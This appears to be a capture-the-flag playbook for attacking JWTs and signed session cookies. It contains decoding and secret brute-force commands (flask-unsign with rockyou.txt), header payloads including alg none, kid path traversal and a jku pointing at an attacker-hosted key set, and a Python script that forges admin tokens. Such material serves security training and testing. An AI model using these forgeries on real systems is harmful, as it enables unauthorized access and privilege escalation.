# Web JWT And Session Attacks

## When to suspect this

- Cookies or headers look like `xxxxx.yyyyy.zzzzz`.
- Session cookie decodes as JSON/base64 or Flask/Django/Express signed data.
- Source shows weak secret, JWT library misuse, or unverified decode.
- Roles/balance/user ID live client-side.
- Auth uses OAuth/OIDC/JWK/JWKS/JWE.

## Fast triage checklist

- Decode token without verifying.
- Identify algorithm and claims.
- Check if changing claims without signature is accepted.
- Test `alg: none`.
- Test RS256-to-HS256 confusion if public key is known.
- Brute weak secrets only after identifying HMAC algorithm.
- Check `kid`, `jku`, `jwk` header injection/path traversal.
- For Flask cookies, decode and try wordlist signing.

## Manual confirmation

```bash
TOKEN='HEADER.PAYLOAD.SIG'
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

Flask:

```bash
flask-unsign --decode --cookie "$COOKIE"
flask-unsign --unsign --cookie "$COOKIE" --wordlist rockyou.txt
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/web/jwt_decode.py](../scripts/web/jwt_decode.py) | Decode JWT/JWE-looking token | `python3 scripts/web/jwt_decode.py TOKEN` | Header/claims JSON |
| [scripts/web/flask_cookie_check.py](../scripts/web/flask_cookie_check.py) | Flask signed cookie | `python3 scripts/web/flask_cookie_check.py --cookie COOKIE --secret SECRET` | Decoded/resigned cookie |
| `flask-unsign` | Flask weak secret brute | `flask-unsign --unsign --cookie COOKIE --wordlist rockyou.txt` | Secret recovered |
| jwt_tool | JWT attacks after manual triage | `python3 jwt_tool.py TOKEN` | Weakness checks |
| Burp Repeater | Claim mutation test | Replace cookie/header | Role accepted/rejected |

## Payload starter pack

Claims to try:

```json
{"role":"admin"}
{"admin":true}
{"is_admin":true}
{"user":"admin"}
{"uid":1}
{"balance":999999}
```

Header attacks:

```json
{"alg":"none","typ":"JWT"}
{"alg":"HS256","kid":"../../../../dev/null"}
{"alg":"HS256","jku":"https://ATTACKER/jwks.json"}
{"alg":"HS256","jwk":{"kty":"oct","k":"..."}}
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import base64, json, hmac, hashlib

SECRET = b"SECRET"
claims = {"user": "admin", "role": "admin"}
header = {"typ": "JWT", "alg": "HS256"}

def b64u(x):
    return base64.urlsafe_b64encode(x).rstrip(b"=")

body = b".".join([
    b64u(json.dumps(header,separators=(",",":")).encode()),
    b64u(json.dumps(claims,separators=(",",":")).encode()),
])
sig = b64u(hmac.new(SECRET, body, hashlib.sha256).digest())
print((body + b"." + sig).decode())
```

## Escalation path

- If unsigned/mutated token works, set admin/uid/balance and access target route.
- If weak secret found, resign token.
- If `kid` reads key file, try `/dev/null` or known public files.
- If `jku`/`jwk` allowed, host attacker key set and forge token.
- If JWE uses public key only, test whether server accepts attacker-encrypted privileged claims.

## Common bypasses

- Base64URL padding omission.
- `alg:none` with empty signature.
- RS256 public key reused as HS256 secret.
- `kid` path traversal to empty/known file.
- `jku` allowlist bypass through redirects/subdomains.
- Duplicate claim names or parser last-wins behavior.
- Flask/Django weak secret signing.
- Timestamp-seeded session PRNG.

## Rabbit holes

- Brute forcing strong JWT secrets without evidence.
- Forgetting token may be encrypted JWE, not signed JWT.
- Changing claims without recomputing signature and misreading rejection.
- Ignoring server-side sessions where cookie is only opaque ID.

## Final solve checklist

- Token/session format is identified.
- Mutation or signing weakness is proven.
- Forged token grants expected privilege.
- Final request with forged token returns flag or target state.

